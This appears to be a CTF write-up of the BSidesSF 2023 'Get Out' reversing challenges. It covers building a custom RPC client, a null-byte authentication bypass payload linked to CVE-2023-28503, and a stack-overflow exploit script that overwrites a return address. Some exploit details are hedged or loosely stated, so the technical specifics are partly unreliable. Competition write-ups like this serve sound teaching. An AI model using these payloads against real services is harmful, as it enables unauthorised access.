---
title: "Escape Protocols: Get Out Series Reversals – BSidesSF 2023"
description: "From crafting a client for a custom RPC, to abusing a CVE with clever payloads, to going full RCE with a stack overflow. The Get Out trilogy was a layered and evolving reverse engineering challenge."
date: '2023-03-04'
categories: ["Reverse Engineering", "CTF Writeups", "Exploitation"]
tags: ["BSidesSF", "RPC", "Stack Overflow", "CVE-2023-28502", "CVE-2023-28503", "Exploit Dev", "RE"]
header:
  image: "/images/getout-bsides2023.jpg"
---

# **Prologue — Three Layers Deep**

When I first saw the `Get Out` series in BSidesSF 2023, I thought it was going to be a quick play. A warmup, a logic check, and maybe some light patching. I didn’t realize I was about to sink hours into crafting an RPC client from scratch, abusing a fresh CVE, and building an exploit chain with an old-school stack overflow.

This wasn’t just one challenge — it was a progression. And it hit every reverse engineering nerve I had.

---

# **getout1 — Talking To The Wall**

The first binary didn’t give much. It was a server — listening quietly on a socket. No documentation, no hints. I ran `strings`, disassembled the binary, and realized it was using a completely custom RPC protocol.

No protobuf. No JSON. Just raw socket data with a strict structure.

## **Reverse Engineering the Protocol**

Using Wireshark and Ghidra, I observed that the protocol looked something like this:

```
[MagicHeader: 4 bytes]
[Opcode: 1 byte]
[PayloadLength: 2 bytes]
[Payload: variable]
```

Each message was padded, and certain opcodes led to different responses. I noticed the flag was fetched via opcode `0x03` — but only after successful login via `0x01`.

## **Crafting My Own Client**

Here’s how I built the initial client in Python:

```python
import socket
import struct

def make_packet(opcode, payload):
    header = b'RPC!'
    length = len(payload)
    return header + struct.pack('>BH', opcode, length) + payload

s = socket.socket()
s.connect(('localhost', 31337))

# Send login
login_payload = b'user\x00pass'
s.send(make_packet(0x01, login_payload))
resp = s.recv(1024)

# Send fetch flag
s.send(make_packet(0x03, b''))
flag = s.recv(1024)
print(flag)
```

Clean, minimal, and it got me the flag once I mimicked the right format.

---

# **getout2 — CVE-2023-28503 Auth Bypass**

This binary was more interesting. I diffed it against getout1, and noticed some logic had changed in the auth handler. After digging through the `strcmp` sequence, I realized this was implementing a known logic flaw — one I had seen in **CVE-2023-28503**.

## **Vulnerability Insight**

The bug boiled down to an insecure username parsing routine:

```c
char username[32];
char password[32];

strncpy(username, input, 64); // dangerous
parse_user_pass(username, password); // delimiter-based parsing
```

This allowed attackers to input data like `user\x00admin:pass`, which would result in bypassing the user/pass separation entirely.

## **Bypass in Action**

My crafted payload:

```python
payload = b'root\x00admin:pass'

# Packed directly into the login RPC
packet = make_packet(0x01, payload)
s.send(packet)
```

The null byte truncated the user, and the parser treated `admin:pass` as the correct credential line.

I used this trick and bypassed the authentication, triggering a flag in the response to opcode `0x03`.

---

# **getout3 — The Real Escape (strncat Overflow)**

This one was the climax of the trilogy.

The RPC handler in this binary used a vulnerable `strncat` operation during its message handling. I spotted this instantly in Ghidra:

```c
char buffer[128];
strncat(buffer, payload, len); // len is not checked properly
```

This classic overflow gave me full control over the stack.

## **Finding The Offset**

I fuzzed the binary using cyclic patterns:

```bash
pattern_create 300
```

Sent the pattern in payload and caught the crash in `gdb` or `x32dbg`, noting the EIP overwrite offset.

## **Exploit Payload**

Once I found the return address offset (say, at 140 bytes), I prepared a simple reverse shell payload (or just a controlled return for the flag):

```python
payload = b"A" * 140
payload += struct.pack('<I', 0x080491e2)  # address of 'win()' or flag print
```

## **RPC Exploit Launcher**

```python
s = socket.socket()
s.connect(('localhost', 31337))

exploit_packet = make_packet(0x04, payload)
s.send(exploit_packet)
flag = s.recv(1024)
print(flag.decode())
```

Clean exploit chain. Rooted the box and retrieved the final flag.

---

# **Epilogue — Escaping in Layers**

Each level of `Get Out` required a different mindset:

- `getout1` was about protocol analysis and custom client crafting.
- `getout2` brought in real-world CVE abuse.
- `getout3` closed it with raw exploitation and return address control.

By the time I reached the end, it wasn’t about just flags — it was about flow. Getting in the zone. Bouncing between static and dynamic, reversing and coding. BSidesSF dropped one of the cleanest RE chains I’ve solved in a while.

Another terminal. Another trilogy cracked.
